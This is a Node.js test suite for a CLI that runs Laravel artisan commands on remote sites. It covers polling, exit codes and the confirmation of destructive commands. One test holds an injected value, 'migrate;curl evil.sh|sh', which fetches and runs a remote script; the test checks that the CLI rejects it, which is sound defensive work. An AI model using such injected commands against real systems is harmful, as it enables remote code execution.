import assert from 'node:assert/strict';
import test from 'node:test';
import { parse } from '../src/cli.mjs';
import { __testing } from '../src/site-commands.mjs';

const { runSiteArtisan, remoteCommandTokens } = __testing;

/**
 * A client that answers from a scripted queue and records what it was asked.
 * Anything unscripted is a test bug, not a pass — a silent undefined would let
 * the command "succeed" against a request it never made.
 */
function fakeClient(responses, fallback = null) {
  const calls = [];
  const queue = [...responses];

  const answer = (method, path, body) => {
    calls.push({ method, path, body });
    const next = queue.shift() ?? fallback;
    if (!next) {
      throw new Error(`unexpected ${method} ${path}`);
    }
    if (next instanceof Error) {
      throw next;
    }

    return next;
  };

  return {
    calls,
    remaining: () => queue.length,
    post: async (path, body) => answer('POST', path, body),
    get: async (path) => answer('GET', path),
  };
}

function apiError(status, body) {
  const err = new Error(body?.message ?? 'error');
  err.status = status;
  err.body = body;

  return err;
}

const RUN = (over = {}) => ({
  data: {
    run_id: 412,
    command: 'migrate',
    args: [],
    status: 'completed',
    mode: 'sync',
    risk: 'mutating-recoverable',
    exit_code: 0,
    stdout: 'Nothing to migrate.\n',
    stderr: '',
    ...over,
  },
});

// Fast polling so the wait loop does not sleep for real.
const FAST = { interval: 1, timeout: 5 };

test('submits the whole command as one string and returns 0 on success', async () => {
  const client = fakeClient([RUN()]);
  const code = await runSiteArtisan(client, 'shop', ['migrate', '--force'], { ...FAST });

  assert.equal(code, 0);
  assert.equal(client.calls[0].path, '/sites/shop/artisan');
  assert.equal(client.calls[0].body.command, 'migrate --force');
  assert.equal(client.calls[0].body.confirm, false);
});

test('propagates a non-zero artisan exit code', async () => {
  const client = fakeClient([RUN({ status: 'failed', exit_code: 2, stderr: 'boom\n' })]);

  assert.equal(await runSiteArtisan(client, 'shop', ['migrate'], { ...FAST }), 2);
});

test('polls a queued run until it settles, then reports its exit code', async () => {
  const client = fakeClient([
    RUN({ status: 'queued', mode: 'async', exit_code: null, stdout: '' }),
    RUN({ status: 'running', exit_code: null, stdout: '' }),
    RUN({ status: 'completed', exit_code: 0 }),
  ]);

  const code = await runSiteArtisan(client, 'shop', ['migrate'], { ...FAST });

  assert.equal(code, 0);
  assert.equal(client.calls[1].method, 'GET');
  assert.equal(client.calls[1].path, '/sites/shop/artisan/runs/412');
  assert.equal(client.remaining(), 0, 'every scripted response should have been consumed');
});

test('--no-wait returns immediately and leaves the run queued', async () => {
  const client = fakeClient([RUN({ status: 'queued', mode: 'async', exit_code: null, stdout: '' })]);

  const code = await runSiteArtisan(client, 'shop', ['migrate'], { 'no-wait': true });

  assert.equal(code, 0);
  assert.equal(client.calls.length, 1, 'must not poll when the caller asked not to wait');
});

test('--run reads back an existing run without submitting anything', async () => {
  const client = fakeClient([RUN()]);

  const code = await runSiteArtisan(client, 'shop', [], { run: '412' });

  assert.equal(code, 0);
  assert.equal(client.calls.length, 1);
  assert.equal(client.calls[0].method, 'GET');
  assert.equal(client.calls[0].path, '/sites/shop/artisan/runs/412');
});

test('giving up on a still-running command reports 0, not a false failure', async () => {
  // The command keeps running server-side; the CLI just stopped watching.
  // Never settles: the fallback answers however many polls the deadline allows.
  const client = fakeClient(
    [RUN({ status: 'queued', mode: 'async', exit_code: null, stdout: '' })],
    RUN({ status: 'running', exit_code: null, stdout: '' }),
  );

  const code = await runSiteArtisan(client, 'shop', ['migrate'], { interval: 1, timeout: 0.02 });

  assert.equal(code, 0);
});

test('--yes confirms on the first attempt, with no second round trip', async () => {
  const client = fakeClient([RUN({ command: 'migrate:fresh', risk: 'destructive' })]);

  const code = await runSiteArtisan(client, 'shop', ['migrate:fresh'], { ...FAST, yes: true });

  assert.equal(code, 0);
  assert.equal(client.calls.length, 1);
  assert.equal(client.calls[0].body.confirm, true);
});

test('a server that still refuses despite --yes surfaces its own error', async () => {
  // Not a missing acknowledgement: telling the user to pass --yes here would
  // be advice they already followed.
  const client = fakeClient([
    apiError(422, { code: 'confirmation_required', risk: 'destructive', message: 'still refused' }),
  ]);

  await assert.rejects(
    () => runSiteArtisan(client, 'shop', ['migrate:fresh'], { ...FAST, yes: true }),
    /still refused/,
  );
});

test('refuses a destructive command off a TTY instead of guessing yes', async () => {
  const client = fakeClient([
    apiError(422, { code: 'confirmation_required', risk: 'destructive', message: 'destructive' }),
  ]);

  await assert.rejects(
    () => runSiteArtisan(client, 'shop', ['migrate:fresh'], { ...FAST }),
    /--yes/,
    'a non-interactive run must say how to proceed, not prompt into a dead stdin',
  );
});

test('a non-confirmation error is not swallowed by the confirm path', async () => {
  const client = fakeClient([apiError(422, { code: 'artisan_unsupported_runtime', message: 'container site' })]);

  await assert.rejects(() => runSiteArtisan(client, 'shop', ['migrate'], { ...FAST }), /container site/);
});

test('rejects a bad verb locally, before spending a round trip', async () => {
  const client = fakeClient([]);

  await assert.rejects(
    () => runSiteArtisan(client, 'shop', ['migrate;curl evil.sh|sh'], { ...FAST }),
    /not an artisan command/,
  );
  assert.equal(client.calls.length, 0);
});

test('a positional site is separated from the command by `--`', () => {
  // The ambiguity this removes: "shop" passes the verb regex, so no amount of
  // local validation could have told it from a command once merged.
  const { args, flags } = parse(['artisan', 'shop', '--', 'migrate', '--force']);
  const rest = remoteCommandTokens(flags);

  assert.deepEqual(args.slice(1), ['shop']);
  assert.deepEqual(rest, ['migrate', '--force']);
});

test('requires a command', async () => {
  const client = fakeClient([]);

  await assert.rejects(() => runSiteArtisan(client, 'shop', [], {}), /Usage: dply site artisan/);
});
